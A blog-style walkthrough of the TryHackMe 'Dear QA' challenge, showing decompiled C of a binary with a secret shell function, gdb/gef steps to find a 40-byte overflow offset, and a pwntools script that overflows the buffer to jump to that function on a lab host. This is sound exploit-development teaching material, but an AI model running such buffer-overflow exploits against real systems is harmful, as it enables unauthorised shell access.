---
title: Walkthrough - Dear QA
published: true
---

Tags: PWN, Reversing, Overflow, ASM.
Description: Are you able to solve this challenge involving reverse engineering and exploit development?
Difficulty: Easy
URL: [https://tryhackme.com/room/dearqa](https://tryhackme.com/room/dearqa)

* * *

## Notes

- `file DearQA.DearQA`
- analyze the file in ghidra

There are a few different functions:

```c
void vuln(void)

{
  puts("Congratulations!");
  puts("You have entered in the secret function!");
  fflush(stdout);
  execve("/bin/bash",(char **)0x0,(char **)0x0);
  return;
}
```

```c
undefined8 main(void)

{
  undefined local_28 [32];
  
  puts("Welcome dearQA");
  puts("I am sysadmin, i am new in developing");
  printf("What\'s your name: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400851,local_28);
  printf("Hello: %s\n",local_28);
  return 0;
}
```

```c
void __libc_csu_init(EVP_PKEY_CTX *param_1,undefined8 param_2,undefined8 param_3)

{
  long lVar1;
  
  lVar1 = 0;
  _init(param_1);
  do {
    (*(code *)(&__frame_dummy_init_array_entry)[lVar1])((ulong)param_1 & 0xffffffff,param_2,param_3)
    ;
    lVar1 = lVar1 + 1;
  } while (lVar1 != 1);
  return;
}
```

So this should be vulnerable to buffer ovrflow however I only have experience doing buffer overflows with windows executables. Buffer overflows occer when we send a program enough data so we can overflow it and overwrite other data or alter it. We might be able to use this vulnerability to jump to the vuln function which executes the /bin/bash and gain access to the server. 

For windows I would use Immunity debugger to find if the files has protections but in linux we can use `gdb` and `gef` to find the protections

![0xskar](/assets/dear-qa01.png)

This shows us that the file has all of the security protections turned off. So now what we need to do is find the offset where we can overflow the binary.

`pattern create 50` creates a pattern of 50 chars that we can use to send to the program. We can then check the memory and see if its overwritten with our pattern.

We then use `r` in gef to run the program and it should crash. so lets examine the memory address. 

![0xskar](/assets/dear-qa02.png)

We can use `x/xg $rsp` to call the memory address then after getting the address use `pattern offset 0x6161616161616166` We can now test to show control of the RSP, by running the binary again and replacing the RSP with all B's.

- create our pattern `python3 -c "print('A' * 40 + 'B' * 8)"` and run the code again pasting in our new pattern.

![0xskar](/assets/dear-qa03.png)

So since we confirmed we have control of the RSP variable, if we were to put a valid address on the RSP we can cause the program to continue through execution of the program. So we can use this to jump to the vuln function. 

Becuase the program has ASLR disabled this mean the binary will use the exact memory addresses every time it starts.

The vuln function has the memory address `0x00400686`

So with all of this information we can now create our exploit.

```python
#!/usr/bin/env python3

# import all from pwn
from pwn import *

# target address
host = "10.10.216.48"
port = "5700"

# target executable information
context(terminal = ['tmux', 'new-window'])
binary = context.binary = ELF("./DearQA.DearQA")
context(os = "linux", arch = "amd64")

# connect to target
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"What's your name: ")
log.info("[+] Crafting payload")

# payload with target memory address
payload = b'A' * 40
payload += p64(0x00400686)

# send payload and keep socket open
log.info("[+] Sending payload to remote server")
connect.sendline(payload)
connect.interactive()
```

Executing the script gives us a reverse shell. However its not sending us back any information when we send characters. We can try to send through another reverse shell.

Not easy!

* * * 

## flag

![0xskar](/assets/dear-qa04.png)

* * * 

